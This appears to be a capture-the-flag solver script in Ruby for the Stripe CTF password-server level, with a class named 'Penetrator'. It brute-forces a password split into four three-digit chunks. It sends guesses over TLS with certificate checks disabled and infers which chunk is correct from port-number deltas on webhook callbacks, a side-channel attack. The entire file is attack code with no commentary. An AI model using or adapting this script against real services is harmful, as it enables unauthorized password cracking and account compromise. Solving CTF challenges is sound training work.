#!/usr/bin/env ruby

require 'socket'
require 'openssl'

STARTING_NUMBERS = [0, 0, 0, 0]
POSITIVE = [false, false, false, false]
#PASSWORD_DB_HOST = 'localhost'
#PASSWORD_DB_HOST = 'level08-2.stripe-ctf.com/user-nmqxiykhfu/'
PASSWORD_DB_HOST = '50.18.217.71'
PASSWORD_DB_PORT = 443
#PASSWORD_DB_POST = '/'
PASSWORD_DB_POST = '/user-nmqxiykhfu/'
#MY_HOST = 'localhost'
MY_HOST = 'level02-4.stripe-ctf.com'
#MY_PORT = 2000
MY_PORT = 2012

class Penetrator

  def initialize
    @numbers = STARTING_NUMBERS
    @positive = POSITIVE
    @last_used_port = 0
    @last_delta = 0
    @reprise_count = 0
    @reprise_max = 10
    @last_min_delta = 2
    @reprise_deltas = []
    @send_socket = TCPSocket.open(PASSWORD_DB_HOST, PASSWORD_DB_PORT)

    ssl_context = OpenSSL::SSL::SSLContext.new
    ssl_context.verify_mode = OpenSSL::SSL::VERIFY_NONE
    @send_socket = OpenSSL::SSL::SSLSocket.new(@send_socket, ssl_context)
    @send_socket.sync = true
    @send_socket.connect

    @hook_socket = TCPServer.new MY_PORT
  end

  def run
    while true do
      send_post_via_socket
      receive_hook
      interprate_result
    end
  end

  def interprate_result
    #puts "last min delta to #{@last_min_delta}"
    # taki sam przyrost
    #wiec ok
    if @last_delta == @last_min_delta
      increase
      @reprise_count = 0
      return
    end

    if @last_delta > @last_min_delta
      puts "positive? count #{@reprise_count}, deltas #{@reprise_deltas}"
      @reprise_count += 1
      @reprise_deltas << @last_delta
    end

    if @reprise_count == @reprise_max
      @reprise_count = 0
      @last_min_delta = @reprise_deltas.min
      @reprise_deltas = []
      positive
    end
  end

  def increase
    (0..3).each do |i|
      if @positive[i] == false
        @numbers[i] = @numbers[i] + 1
        return
      end
    end
  end

  def positive
    puts "OMG positive!"
    (0..3).each do |i|
      if @positive[i] == false
        @positive[i] = true

        if @positive == [true, true, true, true]
          puts "Finished with #{@numbers}"
          exit
        end

        puts "Positives: #{@positive}, numbers: #{@numbers}"

        return
      end
    end

  end

  def receive_hook
    client = @hook_socket.accept    # Wait for a client to connect
    new_port = client.peeraddr[1]

    begin # emulate blocking recv.
      received = client.recv(114) #=> "aaa"
    rescue IO::WaitReadable
      IO.select([client])
      retry
    end

    client.close

    success = received.gsub(/.*success":/m, '')
    @last_delta = new_port - @last_used_port
    puts "Last used port is #{@last_used_port}, new port is #{new_port}. Delta is #{@last_delta}, success is #{success}"

    if success == ' true}'
      exit
    end

    @last_used_port = new_port
  end


  def send_post_via_socket

    string_to_send = "%03d%03d%03d%03d" % @numbers
    params = "{\"password\": \"#{string_to_send}\", \"webhooks\": [\"#{MY_HOST}:#{MY_PORT}\"]}"
    params = "{\"password\": \"#{string_to_send}\", \"webhooks\": [\"#{MY_HOST}:#{MY_PORT}\"]}"

    puts params

    @send_socket.write("POST #{PASSWORD_DB_POST} HTTP/1.1\r\n")
    @send_socket.write("User-Agent: ruby/socket\r\n")
    @send_socket.write("Host: #{PASSWORD_DB_HOST}:#{PASSWORD_DB_PORT}\r\n")
    @send_socket.write("Accept: */*\r\n")
    @send_socket.write("Content-Type: application/x-www-form-urlencoded\r\n")
    @send_socket.write("Content-Length: " + params.size.to_s + "\r\n\r\n")
    @send_socket.write("#{params}\r\n")
    ##get result
    #while a = s.gets
    #  print(a)
    #end

    #s.close
  end
end

penetrator = Penetrator.new
penetrator.run